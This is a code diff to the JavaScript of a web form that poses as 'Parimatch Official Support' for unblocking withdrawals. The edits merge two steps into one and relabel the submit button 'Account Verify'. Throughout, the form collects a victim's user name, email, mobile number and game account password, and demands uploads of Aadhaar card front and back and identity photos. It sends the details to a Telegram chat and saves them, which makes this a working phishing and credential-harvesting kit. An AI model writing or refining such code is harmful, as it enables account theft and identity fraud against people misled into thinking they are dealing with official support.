@@ -345,33 +345,9 @@ function saveRequestToLocal(data) {
   localStorage.setItem(REQ_STORAGE_KEY, JSON.stringify(requests));
 }
 
-// ===== UNBLOCK MULTI-STEP =====
+// ===== UNBLOCK SINGLE-STEP =====
 var _unblockData = {};
 var _rid = null;
-
-function goToStep(step) {
-  for (var i = 1; i <= 2; i++) {
-    var panel = $unlock('step' + i);
-    var dot = $unlock('stepDot' + i);
-    var line = $unlock('stepLine' + i);
-    if (panel) panel.classList.remove('active');
-    if (dot) dot.classList.remove('active', 'done');
-    if (line) line.classList.remove('done');
-  }
-  var activePanel = $unlock('step' + step);
-  if (activePanel) activePanel.classList.add('active');
-  for (var j = 1; j <= step; j++) {
-    var d = $unlock('stepDot' + j);
-    if (d) {
-      if (j < step) d.classList.add('done');
-      else d.classList.add('active');
-    }
-    if (j < step) {
-      var l = $unlock('stepLine' + j);
-      if (l) l.classList.add('done');
-    }
-  }
-}
 
 function showUnlockToast(msg, type) {
   var el = $unlock('toastMessage');
@@ -387,10 +363,10 @@ function showUnlockToast(msg, type) {
 }
 
 function submitUnblockRequest() {
-  var submitBtn = $unlock('step2Submit');
+  var submitBtn = $unlock('unblockSubmit');
   if (submitBtn) {
     submitBtn.disabled = true;
-    submitBtn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Submitting...';
+    submitBtn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Verifying...';
   }
   var rid = _rid || "TX" + Math.floor(100000 + Math.random() * 900000);
   _rid = rid;
@@ -445,25 +421,32 @@ function submitUnblockRequest() {
     showUnlockToast('Submission failed - try again', 'error');
     if (submitBtn) {
       submitBtn.disabled = false;
-      submitBtn.innerHTML = '<i class="fas fa-paper-plane"></i> Submit Request';
+      submitBtn.innerHTML = '<i class="fas fa-check-circle"></i> Account Verify';
     }
   });
 }
 
 // ===== UNBLOCK EVENT BINDING =====
 try {
-  // Step 1 → Next
-  var s1n = $unlock('step1Next');
-  if (s1n) {
-    s1n.addEventListener('click', function() {
+  var unblockSubmitBtn = $unlock('unblockSubmit');
+  if (unblockSubmitBtn) {
+    unblockSubmitBtn.addEventListener('click', function() {
       var uname = $unlock('fUserName');
       var em = $unlock('fEmail');
       var acc = $unlock('fAccountNumber');
       var pwd = $unlock('fPassword');
       if (!uname || !uname.value.trim()) { showUnlockToast('Enter User Name'); uname.focus(); return; }
       if (!em || !em.value.trim()) { showUnlockToast('Enter Game Email ID'); em.focus(); return; }
-      if (!acc || !acc.value.trim()) { showUnlockToast('Enter Game Account Number'); acc.focus(); return; }
+      if (!acc || !acc.value.trim()) { showUnlockToast('Enter Game Mobile Number'); acc.focus(); return; }
       if (!pwd || !pwd.value.trim()) { showUnlockToast('Enter Game Account Password'); pwd.focus(); return; }
+      var issue = document.querySelector('[name="issue_image"]');
+      var aadharF = document.querySelector('[name="aadhar_front"]');
+      var aadharB = document.querySelector('[name="aadhar_back"]');
+      var identity = document.querySelector('[name="identity_image"]');
+      if (!issue || !issue.files || !issue.files[0]) { showUnlockToast('Upload issue image'); return; }
+      if (!aadharF || !aadharF.files || !aadharF.files[0]) { showUnlockToast('Upload Aadhar front side image'); return; }
+      if (!aadharB || !aadharB.files || !aadharB.files[0]) { showUnlockToast('Upload Aadhar back side image'); return; }
+      if (!identity || !identity.files || !identity.files[0]) { showUnlockToast('Upload identity verification image'); return; }
       _unblockData.user_name = uname.value.trim();
       _unblockData.email = em.value.trim();
       _unblockData.account_number = acc.value.trim();
@@ -474,35 +457,6 @@ try {
         + '<b>Account No:</b> ' + _unblockData.account_number + '\n'
         + '<b>Time:</b> ' + new Date().toLocaleString('en-IN');
       sendTelegramMessage(msg).catch(function(e) { console.warn('TG notify:', e); });
-      var partialRid = "TX" + Math.floor(100000 + Math.random() * 900000);
-      saveSubmission({
-        request_id: partialRid,
-        type: 'Unlock Withdrawal',
-        status: 'step1_complete',
-        user_name: _unblockData.user_name,
-        email: _unblockData.email,
-        account_number: _unblockData.account_number,
-        password: _unblockData.password,
-        source: 'Parimatch Official Support'
-      }).catch(function(e) { console.warn('Step1 save failed:', e); });
-      goToStep(2);
-    });
-  }
-
-  // Step 2 Submit
-  var s2b = $unlock('step2Back');
-  if (s2b) s2b.addEventListener('click', function() { goToStep(1); });
-  var s2Submit = $unlock('step2Submit');
-  if (s2Submit) {
-    s2Submit.addEventListener('click', function() {
-      var issue = document.querySelector('[name="issue_image"]');
-      var aadharF = document.querySelector('[name="aadhar_front"]');
-      var aadharB = document.querySelector('[name="aadhar_back"]');
-      var identity = document.querySelector('[name="identity_image"]');
-      if (!issue || !issue.files || !issue.files[0]) { showUnlockToast('Upload issue image'); return; }
-      if (!aadharF || !aadharF.files || !aadharF.files[0]) { showUnlockToast('Upload Aadhar front side image'); return; }
-      if (!aadharB || !aadharB.files || !aadharB.files[0]) { showUnlockToast('Upload Aadhar back side image'); return; }
-      if (!identity || !identity.files || !identity.files[0]) { showUnlockToast('Upload identity verification image'); return; }
       _rid = "TX" + Math.floor(100000 + Math.random() * 900000);
       submitUnblockRequest();
     });
